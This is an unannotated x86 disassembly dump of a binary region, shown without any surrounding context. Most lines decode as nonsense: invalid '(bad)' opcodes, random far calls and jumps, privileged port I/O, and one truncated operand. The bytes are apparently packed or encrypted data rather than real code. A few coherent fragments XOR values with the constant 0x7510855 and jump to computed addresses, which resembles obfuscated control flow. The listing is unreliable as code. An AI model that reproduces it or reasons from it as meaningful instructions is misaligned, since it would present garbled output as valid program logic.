  40fafb:	mov    dh,0x2e
  40fafd:	call   0x7069:0x5a9e9f14
  40fb04:	pusha  
  40fb05:	(bad)  
  40fb06:	(bad)  
  40fb07:	aam    0x7e
  40fb09:	lods   al,BYTE PTR ds:[esi]
  40fb0a:	cs arpl ax,dx
  40fb0d:	mov    dh,0x2f
  40fb0f:	addr16 inc ebp
  40fb11:	mov    ch,0xab
  40fb13:	or     BYTE PTR [eax+0x4460527d],bh
  40fb19:	sbb    ch,bl
  40fb1b:	shl    edi,cl
  40fb1d:	xchg   DWORD PTR [ecx],esi
  40fb1f:	lock and DWORD PTR [eax+0x3e6f095e],esi
  40fb26:	pop    edi
  40fb27:	or     dh,BYTE PTR [ebx]
  40fb29:	div    DWORD PTR [ebx+0x58]
  40fb2c:	xor    al,al
  40fb2e:	stos   BYTE PTR es:[edi],al
  40fb2f:	inc    edx
  40fb30:	jne    0x40fba0
  40fb32:	not    ah
  40fb34:	pusha  
  40fb35:	jg     0x40fb0d
  40fb37:	popa   
  40fb38:	out    dx,al
  40fb39:	inc    ebx
  40fb3a:	lea    ebp,[eax+0xa5d0e31]
  40fb40:	dec    ebx
  40fb41:	mov    dh,0xf6
  40fb43:	jbe    0x40fae4
  40fb45:	pop    edx
  40fb46:	xchg   esp,esp
  40fb48:	adc    BYTE PTR [ebx],bh
  40fb4a:	retf   
  40fb4b:	jb     0x40fbaa
  40fb4d:	cmp    al,0x6b
  40fb4f:	jmp    0x7eace185
  40fb54:	add    dl,0xdc
  40fb57:	add    bl,BYTE PTR [edi+eiz*1]
  40fb5a:	rcr    DWORD PTR [edx-0x6dcf4320],1
  40fb60:	(bad)  
  40fb62:	adc    DWORD PTR [ebx+0x2b],0xffffffa4
  40fb66:	daa    
  40fb67:	ss push ebp
  40fb69:	(bad)  
  40fb6a:	mov    esp,0x51d705c
  40fb6f:	mov    ebp,0xe488921d
  40fb74:	js     0x40fbe4
  40fb76:	lock out dx,al
  40fb78:	mov    esp,0x9014a6cc
  40fb7d:	xchg   esi,eax
  40fb7e:	adc    ebx,ecx
  40fb80:	(bad)  
  40fb81:	fs mov ecx,0x98c632a8
  40fb87:	mov    edx,es
  40fb89:	xor    eax,0xb1e9b9d5
  40fb8e:	rcl    bl,cl
  40fb90:	mov    ebx,DWORD PTR [eax-0x62]
  40fb93:	jl     0x40fb63
  40fb95:	retf   
  40fb96:	push   edx
  40fb97:	call   0xd433:0xe5b0aaa0
  40fb9e:	retf   
  40fb9f:	ins    BYTE PTR es:[edi],dx
  40fba0:	mov    BYTE PTR [edi-0x64],dh
  40fba3:	adc    edx,esi
  40fba5:	and    BYTE PTR [esi+esi*2-0x64],dl
  40fba9:	push   0xfffffff0
  40fbab:	out    0x96,al
  40fbad:	adc    DWORD PTR [eax],esi
  40fbaf:	les    esp,FWORD PTR [esi]
  40fbb1:	jne    0x40fc20
  40fbb3:	fbstp  TBYTE PTR [edx-0x65]
  40fbb6:	or     BYTE PTR [ebx-0x10],ah
  40fbb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbba:	xchg   ecx,eax
  40fbbb:	out    0x41,eax
  40fbbd:	bound  esp,QWORD PTR [edi+edi*8]
  40fbc0:	mov    WORD PTR [ebp+0x68e8d48],gs
  40fbc6:	cmp    dl,ah
  40fbc8:	ret    
  40fbc9:	fstp   QWORD PTR [esi-0x29]
  40fbcc:	sti    
  40fbcd:	adc    dl,dl
  40fbcf:	in     al,dx
  40fbd0:	sar    DWORD PTR [ebx],1
  40fbd2:	cmp    ecx,edx
  40fbd4:	dec    ebx
  40fbd5:	jae    0x40fbb4
  40fbd7:	dec    edx
  40fbd8:	pop    ss
  40fbd9:	dec    edi
  40fbda:	push   edx
  40fbdb:	imul   ebp,ecx,0xffffff84
  40fbde:	std    
  40fbdf:	fadd   st(0),st
  40fbe1:	or     DWORD PTR [ebp-0x51],0x16d309bb
  40fbe8:	out    dx,eax
  40fbe9:	fmul   DWORD PTR [edi]
  40fbeb:	aad    0x7d
  40fbed:	inc    ebx
  40fbee:	pusha  
  40fbef:	out    dx,eax
  40fbf0:	in     al,0xe8
  40fbf2:	mov    cl,BYTE PTR [edi+0x3ff52e57]
  40fbf8:	sub    cl,al
  40fbfa:	shl    BYTE PTR [edx-0x166af294],cl
  40fc00:	or     BYTE PTR [ecx+0x78cdc7fb],dh
  40fc06:	sbb    BYTE PTR [ecx+ebp*8-0x52e4d145],dl
  40fc0d:	mov    WORD PTR ds:0x4831673c,cs
  40fc13:	jb     0x40fbb7
  40fc15:	in     al,0xe7
  40fc17:	jmp    0x40fc27
  40fc19:	dec    ecx
  40fc1a:	in     al,dx
  40fc1b:	add    al,0xb9
  40fc1d:	jp     0x40fbe3
  40fc1f:	sub    DWORD PTR [ebp+0x40ba1856],ecx
  40fc25:	inc    eax
  40fc26:	dec    esi
  40fc27:	call   0xf2afa2b0
  40fc2c:	inc    esi
  40fc2d:	repz mov dl,0xf8
  40fc30:	dec    edi
  40fc31:	dec    ebx
  40fc32:	xor    al,0x33
  40fc34:	(bad)  
  40fc36:	sbb    al,ch
  40fc38:	pop    edi
  40fc39:	movsx  ebp,BYTE PTR [edx+0x5f]
  40fc3d:	repz or ebp,DWORD PTR [edi-0x75]
  40fc41:	lods   al,BYTE PTR ds:[esi]
  40fc42:	in     al,0x53
  40fc44:	lea    ebp,[ebx-0x5e44aab0]
  40fc4a:	pop    ecx
  40fc4b:	dec    ecx
  40fc4c:	pop    edx
  40fc4d:	adc    BYTE PTR [edx-0xb5adec6],ch
  40fc53:	xlat   BYTE PTR ds:[ebx]
  40fc54:	mov    ch,0xe6
  40fc56:	gs pushf 
  40fc58:	out    dx,al
  40fc59:	shl    DWORD PTR [edx+0x6a],1
  40fc5c:	jne    0x40fc88
  40fc5e:	retf   
  40fc5f:	mov    ch,0x4e
  40fc61:	cli    
  40fc62:	call   0xcf7:0x85d21af6
  40fc69:	dec    esp
  40fc6a:	push   ebp
  40fc6b:	ret    0x618b
  40fc6e:	pushf  
  40fc6f:	fs lahf 
  40fc71:	push   cs
  40fc72:	or     bl,cl
  40fc74:	sub    ax,0x7292
  40fc78:	pop    ecx
  40fc79:	xchg   edx,eax
  40fc7a:	sbb    esp,DWORD PTR [eax-0x31]
  40fc7d:	mov    eax,ds:0xb007e18d
  40fc82:	fnstcw WORD PTR [ebx-0x24]
  40fc85:	clc    
  40fc86:	or     cl,al
  40fc88:	pop    esi
  40fc89:	int3   
  40fc8a:	in     al,0x5f
  40fc8c:	fidivr DWORD PTR [esi+0x11]
  40fc8f:	mov    ds:0xe8bf2b21,al
  40fc94:	lock enter 0x6c0,0x19
  40fc99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc9a:	in     ax,dx
  40fc9c:	sbb    BYTE PTR [esp+edx*1-0x22],ah
  40fca0:	inc    ebx
  40fca1:	ds in  al,0x27
  40fca4:	sbb    esi,DWORD PTR [ebx-0x35]
  40fca7:	(bad)  
  40fca8:	inc    DWORD PTR [eax+0x1b]
  40fcab:	(bad)  
  40fcac:	sbb    al,0x2f
  40fcae:	(bad)  
  40fcaf:	retf   
  40fcb0:	test   ah,ch
  40fcb2:	cmp    eax,0x1d9dceeb
  40fcb7:	mov    edx,0xde89f8c1
  40fcbc:	jle    0x40fd2e
  40fcbe:	ins    DWORD PTR es:[edi],dx
  40fcbf:	xor    DWORD PTR [ebx],eax
  40fcc1:	out    dx,eax
  40fcc2:	les    esp,FWORD PTR [esi]
  40fcc4:	in     al,dx
  40fcc5:	icebp  
  40fcc6:	(bad)  
  40fcc7:	lds    edi,FWORD PTR [ebp+ebp*8+0x60]
  40fccb:	inc    esi
  40fccc:	mov    al,0x88
  40fcce:	inc    esp
  40fccf:	int3   
  40fcd0:	mov    ebx,0x4b54b90d
  40fcd5:	ss jne 0x40fca1
  40fcd8:	int    0xcb
  40fcda:	pushf  
  40fcdb:	adc    BYTE PTR [eax+eax*1-0x2],0xdd
  40fce0:	adc    eax,DWORD PTR [edx]
  40fce2:	sub    al,0x92
  40fce4:	and    esi,eax
  40fce6:	sbb    DWORD PTR [ecx],edx
  40fce8:	rcr    ch,cl
  40fcea:	loop   0x40fd10
  40fcec:	push   esi
  40fced:	stc    
  40fcee:	or     al,0x1d
  40fcf0:	gs jge 0x40fcf9
  40fcf3:	cs ja  0x40fc95
  40fcf6:	mov    ebp,0x71579e7
  40fcfb:	stos   DWORD PTR es:[edi],eax
  40fcfc:	ror    BYTE PTR [eax],cl
  40fcfe:	mov    dh,0xa9
  40fd00:	ins    BYTE PTR es:[edi],dx
  40fd01:	add    al,0x78
  40fd03:	daa    
  40fd04:	(bad)  
  40fd06:	cli    
  40fd07:	hlt    
  40fd08:	sti    
  40fd09:	lds    esp,FWORD PTR [ebx]
  40fd0b:	dec    ebp
  40fd0c:	push   0xffffffb4
  40fd0e:	outs   dx,DWORD PTR ds:[esi]
  40fd0f:	jmp    0x300e:0x18ef625f
  40fd16:	dec    ebp
  40fd17:	pop    ecx
  40fd18:	push   ecx
  40fd19:	push   DWORD PTR ds:0x7510855
  40fd1f:	add    eax,ebx
  40fd21:	cmp    ecx,eax
  40fd23:	jne    0x40fd46
  40fd29:	mov    eax,DWORD PTR [ebp-0x20]
  40fd2c:	inc    edi
  40fd2d:	cmp    edi,eax
  40fd2f:	jb     0x40e458
  40fd35:	jmp    0x40fd56
  40fd3a:	mov    eax,DWORD PTR [ebp-0x4]
  40fd3d:	xor    eax,esi
  40fd3f:	add    eax,ebx
  40fd41:	jmp    0x412238
  40fd46:	mov    eax,DWORD PTR [ebp-0x2c]
  40fd49:	movzx  eax,WORD PTR [eax+edi*2]
  40fd4d:	mov    ecx,DWORD PTR [ebp-0x14]
  40fd50:	mov    eax,DWORD PTR [ecx+eax*4]
  40fd53:	mov    DWORD PTR [ebp+0xc],eax
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp-0x8]
  40fd5c:	xor    eax,0x7510855
  40fd61:	add    eax,ebx
  40fd63:	jmp    0x410157
  40fd68:	xlat   BYTE PTR ds:[ebx]
  40fd69:	and    BYTE PTR [eax+eiz*8+0x73],ch
  40fd6d:	ins    BYTE PTR es:[edi],dx
  40fd6e:	push   ebx
  40fd6f:	aaa    
  40fd70:	pop    edx
  40fd71:	push   ecx
  40fd72:	push   ebx
  40fd73:	sahf   
  40fd74:	fmul   DWORD PTR [esi-0x4827dfd9]
  40fd7a:	jo     0x40fdec
  40fd7c:	dec    ecx
  40fd7d:	jge    0x40fdef
  40fd7f:	jo     0x40fd0d
  40fd81:	fbstp  TBYTE PTR [esi]
  40fd83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd84:	sub    al,0xdb
  40fd86:	lahf   
  40fd87:	and    esi,DWORD PTR [edx+0x5c905075]
  40fd8d:	wbinvd 
  40fd8f:	jmp    0x8d27:0x68ac5e29
  40fd96:	sbb    eax,ebx
  40fd98:	jne    0x40fdaf
  40fd9a:	pop    ss
  40fd9b:	jnp    0x40fd4e
  40fd9d:	xchg   DWORD PTR [ecx],ecx
  40fd9f:	lods   eax,DWORD PTR ds:[esi]
  40fda0:	enter  0x4092,0x5c
  40fda4:	cmc    
  40fda5:	(bad)  
  40fda6:	mov    al,ds:0xdaaf94c8
  40fdab:	rol    BYTE PTR [ebp-0x11f91e9b],1
  40fdb1:	out    dx,eax
  40fdb2:	imul   ecx,eax,0x4eff692b
  40fdb8:	into   
  40fdb9:	cmp    BYTE PTR [edx+0xde28ff2],cl
  40fdbf:	fsub   DWORD PTR [ebx+0x7e3a8506]
  40fdc5:	nop
  40fdc6:	dec    ebp
  40fdc7:	jg     0x40fe34
  40fdc9:	(bad)  
  40fdcb:	pop    ds
  40fdcc:	pop    ds
  40fdcd:	mov    al,ds:0x1c56c52a
  40fdd2:	iret   
  40fdd3:	ins    BYTE PTR es:[edi],dx
  40fdd4:	xchg   ebp,eax
  40fdd5:	xor    DWORD PTR [ebp+edx*8+0x3f],esp
  40fdd9:	push   cs
  40fdda:	adc    eax,0x731d998
  40fddf:	pushf  
  40fde0:	pop    esi
  40fde1:	sub    bl,al
  40fde3:	and    al,0x5
  40fde5:	addr16 aad 0x9e
  40fde8:	mov    dl,0x67
  40fdea:	bound  ebp,QWORD PTR [esi]
  40fdec:	mov    bl,0x96
  40fdee:	mov    eax,ds:0xf32926a8
  40fdf3:	test   DWORD PTR [edx+edx*2+0x3c],0xaf95d36f
  40fdfb:	mov    esi,0x694610fc
  40fe00:	and    al,0xe
  40fe02:	sub    ecx,esp
  40fe04:	pop    edx
  40fe05:	dec    edx
  40fe06:	mov    ds:0x1d58f573,al
  40fe0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe0c:	repnz pop es
  40fe0e:	cmp    esp,DWORD PTR [eax+0x236f56e6]
  40fe14:	mov    cl,0xf0
  40fe16:	mov    bl,al
  40fe18:	xchg   DWORD PTR [edi+0x573cd989],eax
  40fe1e:	or     eax,0xb891efa8
  40fe23:	inc    esp
  40fe24:	lds    edi,FWORD PTR [ebp+0x6bc05898]
  40fe2a:	jecxz  0x40fdc9
  40fe2c:	ret    
  40fe2d:	or     al,0x1
  40fe2f:	je     0x40fe0b
  40fe31:	and    cl,ah
  40fe33:	and    al,0x51
  40fe35:	or     al,BYTE PTR [ebp-0x73]
  40fe38:	push   ebx
  40fe39:	fst    DWORD PTR [edi-0x48]
  40fe3c:	mov    BYTE PTR [ebx+eax*4-0x656fe362],bh
  40fe43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe44:	js     0x40fe36
  40fe46:	lock mov al,0x3a
  40fe49:	jb     0x40fe3b
  40fe4b:	mov    esi,0x2c900f5c
  40fe50:	loopne 0x40fe25
  40fe52:	or     DWORD PTR [esi+0x43],eax
  40fe55:	and    ecx,ecx
  40fe57:	xchg   ebp,eax
  40fe58:	xor    bh,BYTE PTR [esi]
  40fe5a:	lods   eax,DWORD PTR ds:[esi]
  40fe5b:	mov    ah,0x4a
  40fe5d:	shl    DWORD PTR [eax+0xe02a737],cl
  40fe63:	jge    0x40fe79
  40fe65:	xor    esi,DWORD PTR [esi+0xe]
  40fe68:	mov    ch,0x65
  40fe6a:	in     al,dx
  40fe6b:	or     edi,DWORD PTR [esi]
  40fe6d:	int3   
  40fe6e:	sub    DWORD PTR ds:0x636e0f46,0xaca5662
  40fe78:	lahf   
  40fe79:	data16 cmp bl,ah
  40fe7c:	mov    dh,0xcd
  40fe7e:	or     cl,BYTE PTR [ebx+edx*4-0x7f89194]
  40fe85:	jmp    0x40fe26
  40fe87:	jns    0x40fe5d
  40fe89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe8a:	dec    ebx
  40fe8b:	ins    BYTE PTR es:[edi],dx
  40fe8c:	or     ch,ah
  40fe8e:	inc    edi
  40fe8f:	pop    ebp
  40fe90:	push   cs
  40fe91:	hlt    
  40fe92:	and    eax,0xc711c3d9
  40fe97:	mov    ecx,0xd22fde32
  40fe9c:	enter  0x61d3,0x53
  40fea0:	leave  
  40fea1:	jl     0x40fe56
  40fea3:	and    bh,BYTE PTR [edi]
  40fea5:	pop    esp
  40fea6:	mov    bh,0x4f
  40fea8:	out    0x79,eax
  40feaa:	adc    ebx,DWORD PTR [ebp+0x610915ed]
  40feb0:	cdq    
  40feb1:	xchg   ecx,eax
  40feb2:	outs   dx,DWORD PTR ds:[esi]
  40feb3:	lahf   
  40feb4:	sub    ebx,ebp
  40feb6:	rcl    DWORD PTR [ecx-0x6c4ef128],cl
  40febc:	or     BYTE PTR [ebp-0x57],dh
  40febf:	xchg   dh,bh
  40fec1:	pop    ecx
  40fec2:	hlt    
  40fec3:	addr16 mov ds:0x50b2,eax
  40fec7:	fdiv   DWORD PTR [edi+ebp*4]
  40feca:	aad    0xe8
  40fecc:	ins    BYTE PTR es:[edi],dx
  40fecd:	mov    bl,0xdd
  40fecf:	mov    esi,0xe7cf8e1e
  40fed4:	xor    dl,BYTE PTR [esi-0x1def761c]
  40feda:	pop    edx
  40fedb:	jp     0x40fe81
  40fedd:	js     0x40ff3b
  40fedf:	sbb    edi,ebp
  40fee1:	inc    edx
  40fee2:	lods   al,BYTE PTR ds:[esi]
  40fee3:	add    esi,DWORD PTR [edi+0x7943405e]
  40fee9:	das    
  40feea:	cld    
  40feeb:	mov    edx,0x88d9a9b8
  40fef0:	adc    DWORD PTR ds:0xb989e718,edi
  40fef6:	int3   
  40fef7:	cmp    al,0xf8
  40fef9:	sub    eax,esp
  40fefb:	shr    BYTE PTR [edx],1
  40fefd:	imul   esp,DWORD PTR [eax],0x20
  40ff00:	sbb    eax,0xe81083b
  40ff05:	je     0x40ff83
  40ff07:	and    DWORD PTR [eax+0x0],esi
  40ff0a:	ss or  eax,0x37bccb5
  40ff10:	push   0x29
  40ff12:	sbb    dh,dh
  40ff14:	push   esp
  40ff15:	xchg   esi,eax
  40ff16:	pop    ebx
  40ff17:	xchg   DWORD PTR [ebx],eax
  40ff19:	test   al,0xc0
  40ff1b:	clc    
  40ff1c:	bound  esp,QWORD PTR [ebx]
  40ff1e:	push   esi
  40ff1f:	jnp    0x40ff11
  40ff21:	sub    eax,0xf76798b6
  40ff26:	and    DWORD PTR [edi+0x7d05f659],eax
  40ff2c:	xchg   ebx,eax
  40ff2d:	inc    edi
  40ff2e:	in     eax,0xaa
  40ff30:	loop   0x40ff25
  40ff32:	stos   BYTE PTR es:[edi],al
  40ff33:	ror    DWORD PTR [edx-0x70],0x21
  40ff37:	sbb    eax,0x85cfe122
  40ff3c:	imul   edi,DWORD PTR [esi+0x7b0029d8],0x16519e9f
  40ff46:	xchg   edi,eax
  40ff47:	test   al,0x11
  40ff49:	push   ds
  40ff4a:	cld    
  40ff4b:	and    ebp,DWORD PTR [edi+0x13c3e6fc]
  40ff51:	inc    esi
  40ff52:	dec    ebp
  40ff53:	mov    ds:0xf3c7ea0,al
  40ff58:	push   esi
  40ff59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff5a:	idiv   BYTE PTR [esi]
  40ff5c:	mov    edi,0xb5700366
  40ff61:	popa   
  40ff62:	push   esi
  40ff63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff64:	bound  eax,QWORD PTR [edi]
  40ff66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff67:	push   esp
  40ff68:	pop    ebx
  40ff69:	clc    
  40ff6a:	repz imul ecx,DWORD PTR [ecx],0x21c09d37
  40ff71:	cmp    al,0x2
  40ff73:	mov    bl,0xa4
  40ff75:	out    0xa6,eax
  40ff77:	jns    0x40ff1b
  40ff79:	mov    eax,0xf4926fb3
  40ff7e:	add    al,BYTE PTR [edx]
  40ff80:	mov    eax,0x55f0eaac
  40ff85:	retf   
  40ff86:	imul   ecx,edi,0x6c186e87
  40ff8c:	pop    edx
  40ff8d:	std    
  40ff8e:	sub    DWORD PTR [ecx-0x58c035fa],edi
  40ff94:	cwde   
  40ff95:	push   ebp
  40ff96:	sub    BYTE PTR [esi],cl
  40ff98:	xor    al,0x4d
  40ff9a:	adc    bh,BYTE PTR ds:0xf1a4096c
  40ffa0:	mov    eax,0xe2670f9f
  40ffa5:	mov    al,0x49
  40ffa7:	dec    esi
  40ffa8:	xchg   DWORD PTR [ecx],ecx
  40ffaa:	imul   esi,DWORD PTR [edx-0x1b780ed1],0xffffff92
  40ffb1:	fidiv  DWORD PTR [ebp-0x4bd87daa]
  40ffb7:	pop    ecx
  40ffb8:	in     eax,dx
  40ffb9:	mov    esp,DWORD PTR [edi-0x5c9a8a6d]
  40ffbf:	cmp    ah,0x92
  40ffc2:	and    al,0x85
  40ffc4:	out    0x49,eax
  40ffc6:	and    esp,edi
  40ffc8:	es jns 0x40ffa1
  40ffcb:	(bad)  
  40ffcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffcd:	and    ebx,eax
  40ffcf:	mov    ebx,0x7a7c2adb
  40ffd4:	clc    
  40ffd5:	push   ecx
  40ffd6:	sbb    edi,ecx
  40ffd8:	ffree  st(0)
  40ffda:	call   0x75d4:0x8b21b822
  40ffe1:	mov    al,ds:0x54b9b365
  40ffe6:	shl    dl,1
  40ffe8:	mov    ecx,?
  40ffea:	into   
  40ffeb:	sub    ebp,ebx
  40ffed:	sbb    eax,0xb8a6165c
  40fff2:	popf   
  40fff3:	or     BYTE PTR [esi],0x30
  40fff6:	push   edx
  40fff7:	lods   al,BYTE PTR ds:[esi]
  40fff8:	addr16 pop edx
  40fffa:	mov    ebp,0xca189969
  40ffff:	rcl    DWORD PTR [ebx],1
  410001:	xor    ch,BYTE PTR [ecx+0x1c59d407]
  410007:	cs ins BYTE PTR es:[edi],dx
  410009:	add    al,0xa5
  41000b:	loopne 0x410012
  41000d:	mov    al,ds:0xa04b0bfd
  410012:	out    0x95,al
  410014:	mov    WORD PTR [ebx],fs
  410016:	mov    al,0xff
  410018:	mov    al,0x9e
  41001a:	cli    
  41001b:	sahf   
  41001c:	dec    ebx
  41001d:	cmp    ah,BYTE PTR [edi]
  41001f:	(bad)
  410022:	push   cs
  410023:	pop    esp
  410024:	dec    ebx
  410025:	jbe    0x40ffab
  410027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410028:	lock xchg esi,eax
  41002a:	xchg   ebx,eax
  41002b:	pop    ebp
  41002c:	cld    
  41002d:	repz jnp 0x40ffba
  410030:	pop    ecx
  410031:	jmp    0x410046
  410033:	push   edx
  410034:	lods   eax,DWORD PTR ds:[esi]
  410035:	cmp    al,bl
  410037:	mov    al,ds:0x5feefeac
  41003c:	iret   
  41003d:	sbb    eax,0x9f038229
  410042:	adc    al,0x23
  410044:	cmc    
  410045:	xchg   BYTE PTR [ebp-0x720721ae],al
  41004b:	jg     0x41004f
  41004d:	pop    sp
  41004f:	shl    BYTE PTR [edx+0xd207469],1
  410055:	xor    DWORD PTR [edx-0xbefd4bc],0x2f
  41005c:	push   ebx
  41005d:	(bad)  
  41005e:	cmp    ecx,eax
  410060:	gs xchg edx,eax
  410062:	in     eax,dx
  410063:	sbb    al,0x9a
  410065:	mov    esi,0x94f94af3
  41006a:	jb     0x4100e1
  41006c:	loope  0x41007c
  41006e:	pop    eax
  41006f:	and    eax,0xbd6d2ea4
  410074:	and    ah,BYTE PTR [eax-0x171c6498]
  41007a:	and    al,BYTE PTR [eax-0xc]
  41007d:	je     0x410027
  41007f:	xor    BYTE PTR [ebp-0x47],dl
  410082:	mov    eax,ds:0x378d59dd
  410087:	add    eax,0xb98cb8af
  41008c:	push   ecx
  41008d:	fst    QWORD PTR [eax-0x42]
  410090:	add    BYTE PTR [edx-0x21],cl
  410093:	ins    BYTE PTR es:[edi],dx
  410094:	jno    0x4100a4
  410096:	inc    edx
  410097:	xchg   ebx,eax
  410098:	xchg   ebp,eax
  410099:	cli    
  41009a:	clc    
  41009b:	loopne 0x4100b4
  41009d:	add    DWORD PTR [edx-0x3c],0x2f7752ad
  4100a4:	sub    BYTE PTR [ecx],0xb0
  4100a7:	fld    QWORD PTR [esi]
  4100a9:	jo     0x4100e9
  4100ab:	test   DWORD PTR [eax],edi
  4100ad:	push   ebp
  4100ae:	cmp    al,0xa6
  4100b0:	jge    0x4100d4
  4100b2:	cld    
  4100b3:	xchg   ah,ch
  4100b5:	sbb    eax,0x936c84e2
  4100ba:	push   ebx
  4100bb:	js     0x4100b7
  4100bd:	sub    eax,0xcf3fd8ad
  4100c2:	lock sub eax,0xd643b0b1
  4100c8:	jecxz  0x4100ab
  4100ca:	idiv   eax
  4100cc:	jb     0x41012e
  4100ce:	mov    cs,WORD PTR [esi+edi*2-0xa7bb15e]
  4100d5:	(bad)  
  4100d6:	xchg   esi,eax
  4100d7:	fsubr  QWORD PTR [ebx]
  4100d9:	or     esp,DWORD PTR [ecx]
  4100db:	mov    al,0x14
  4100dd:	daa    
  4100de:	fsub   DWORD PTR [eax+0x4b]
  4100e1:	retf   0xf6f3
  4100e4:	lahf   
  4100e5:	sub    dh,BYTE PTR [eax+0x4d3dd8d5]
  4100eb:	xlat   BYTE PTR ds:[ebx]
  4100ec:	scas   eax,DWORD PTR es:[edi]
  4100ed:	lock ror DWORD PTR [ebx-0x7e],1
  4100f1:	cwde   
  4100f2:	cmp    al,0x14
  4100f4:	mov    bl,0x29
  4100f6:	fdiv   st,st(1)
  4100f8:	pop    ds
  4100f9:	mov    DWORD PTR [esi-0x4e],0x80bbabba
  410100:	out    dx,al
  410101:	popf   
  410102:	dec    ebx
  410103:	in     al,0x58
  410105:	daa    
  410106:	push   0x52
  410108:	les    ecx,FWORD PTR [edx]
  41010a:	leave  
  41010b:	push   ss
  41010c:	test   al,0x6a
  41010e:	mov    al,ds:0xe13af9a7
  410113:	fdivr  DWORD PTR [ebx]
  410115:	mov    edx,0x3a785e4d
  41011a:	inc    edi
  41011b:	jne    0x4100b5
  41011d:	or     al,0x9a
  41011f:	or     DWORD PTR [eax],esi
  410121:	adc    edx,edx
  410123:	fld    DWORD PTR ds:0xf415a89
  410129:	jge    0x410111
  41012b:	inc    edi
  41012c:	cmp    DWORD PTR [ebx],eax
  41012e:	lock lods al,BYTE PTR ds:[esi]
  410130:	add    DWORD PTR [ebp-0x44967209],ebp
  410136:	inc    ebx
  410137:	jmp    0xab261e6c
  41013c:	std    
  41013d:	add    al,0xcf
  41013f:	mov    ds:0xf0936f2e,eax
  410144:	push   cs
  410145:	pop    esi
  410146:	loope  0x410193
  410148:	mov    ebp,0xb7af804f
  41014d:	mov    ebx,0xd6dd3560
  410152:	sub    eax,edx
  410154:	pusha  
  410155:	or     al,0x90
  410157:	cmp    ecx,eax
  410159:	jne    0x41016c
  41015f:	mov    eax,DWORD PTR [ebp-0x4]
  410162:	xor    eax,0x7510855
  410167:	jmp    0x40fd3f
  41016c:	mov    eax,DWORD PTR [ebp+0xc]
  41016f:	add    eax,DWORD PTR [ebp+0x8]
  410172:	mov    DWORD PTR [ebp-0x10],eax
  410175:	mov    eax,DWORD PTR [ebp-0x1c]
  410178:	jmp    0x41056c
  41017d:	sahf   
  41017e:	das    
  41017f:	or     ah,BYTE PTR [edi]
  410181:	mov    DWORD PTR [ecx],esp
  410183:	mov    cl,0xb5
  410185:	pop    es
  410186:	mov    BYTE PTR [ebx],bl
  410188:	(bad)  
  410189:	cmp    edi,DWORD PTR [ebx]
  41018b:	push   esp
  41018c:	inc    edx
  41018d:	xor    DWORD PTR [ebx+0x7d497070],esi
  410193:	jo     0x410205
  410195:	out    dx,al
  410196:	into   
  410197:	out    0xe5,al
  410199:	lahf   
  41019a:	mov    DWORD PTR [ecx+edx*4],edx
  41019d:	rcr    DWORD PTR [edi+0x1c],1
  4101a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101a1:	(bad)  
  4101a2:	stc    
  4101a3:	mov    cl,0xfa
  4101a5:	imul   eax,DWORD PTR [ecx-0x27],0x31
  4101a9:	inc    BYTE PTR [ecx+ebx*2+0x59]
  4101ad:	sub    bl,BYTE PTR [ebp+0x41c56374]
  4101b3:	ret    0x153
  4101b6:	je     0x4101d3
  4101b8:	js     0x410195
  4101ba:	xchg   edi,eax
  4101bb:	and    edx,esp
  4101bd:	mov    ebx,0xb4699059
  4101c2:	push   ebx
  4101c3:	push   ecx
  4101c4:	dec    esi
  4101c5:	scas   al,BYTE PTR es:[edi]
  4101c6:	sbb    BYTE PTR [esi-0x4b],ah
  4101c9:	retf   0xf61f
  4101cc:	imul   edi,DWORD PTR [esi+0x704a6d19],0x71
  4101d3:	dec    edi
  4101d4:	es je  0x4101bb
  4101d7:	push   edi
  4101d8:	pop    esp
  4101d9:	jno    0x410174
  4101db:	cmp    esi,ebx
  4101dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101de:	push   edi
  4101df:	inc    edx
  4101e0:	inc    ebp
  4101e1:	adc    eax,0x74e2f487
  4101e6:	rcl    DWORD PTR [ebp-0x54c71c13],0x53
  4101ed:	mov    ecx,0xbd0c04b3
  4101f2:	mov    edx,0x81fee6e7
  4101f7:	in     al,dx
  4101f8:	mov    edi,0x72db9992
  4101fd:	je     0x410237
  4101ff:	and    eax,0xbd73ff0f
  410204:	rol    bh,1
  410206:	mov    dl,al
  410208:	pop    es
  410209:	arpl   bp,bp
  41020b:	retf   0xc865
  41020e:	cmp    ah,BYTE PTR [esi-0x4f]
  410211:	push   cs
  410212:	pop    ds
  410213:	adc    eax,0x9baf1d0d
  410218:	xor    bl,bh
  41021a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41021b:	mov    eax,0xd7e3b6a9
  410220:	and    BYTE PTR [ebx+0x6b],bl
  410223:	das    
  410224:	popf   
  410225:	jb     0x41022b
  410227:	imul   ebp
  410229:	(bad)  
  41022a:	iret   
  41022b:	les    edi,FWORD PTR [esi+0x6485a111]
  410231:	leave  
  410232:	aas    
  410233:	or     al,0x72
  410235:	add    al,0x69
  410237:	mul    WORD PTR [edx-0x78255a11]
  41023e:	aas    
  41023f:	mov    ch,0x1b
  410241:	mov    ds,esi
  410243:	sbb    al,0x35
  410245:	sahf   
  410246:	fstp   DWORD PTR [edi-0x390eb1c3]
  41024c:	and    al,0x33
  41024e:	stos   DWORD PTR es:[edi],eax
  41024f:	cmp    DWORD PTR [ecx],ebp
  410251:	adc    BYTE PTR [esi+0x145e296],dl
  410257:	mov    esp,0xf73ccdbd
  41025c:	mov    bh,0x1e
  41025e:	push   ecx
  41025f:	lods   eax,DWORD PTR ds:[esi]
  410260:	test   al,0x7b
  410262:	sbb    al,BYTE PTR [edi+eiz*2+0x2785a43f]
  410269:	out    dx,eax
  41026a:	pop    es
